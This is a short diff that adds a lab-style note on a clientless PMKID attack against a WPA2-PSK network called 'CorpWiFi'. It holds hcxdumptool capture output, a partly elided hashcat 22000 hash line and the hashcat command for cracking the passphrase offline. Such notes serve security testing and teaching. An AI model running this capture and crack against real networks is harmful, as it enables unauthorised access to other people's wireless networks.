@@ -1,0 +1,11 @@
+hcxdumptool / hcxpcapngtool output (clientless PMKID capture):
+  ESSID:  CorpWiFi
+  BSSID:  a0:63:91:12:34:56
+  Client: (none needed - PMKID pulled from the AP's first EAPOL frame)
+  Encryption: WPA2-PSK (CCMP)
+
+hashcat 22000 line captured:
+WPA*01*7f2c...pmkid...9a*a063911234 56*aabbccddeeff*436f727057694669***
+
+Note: PMKID enables an OFFLINE dictionary/brute attack with no client and no
+de-auth. Recover the PSK with: hashcat -m 22000 pmkid.22000 wordlist.txt
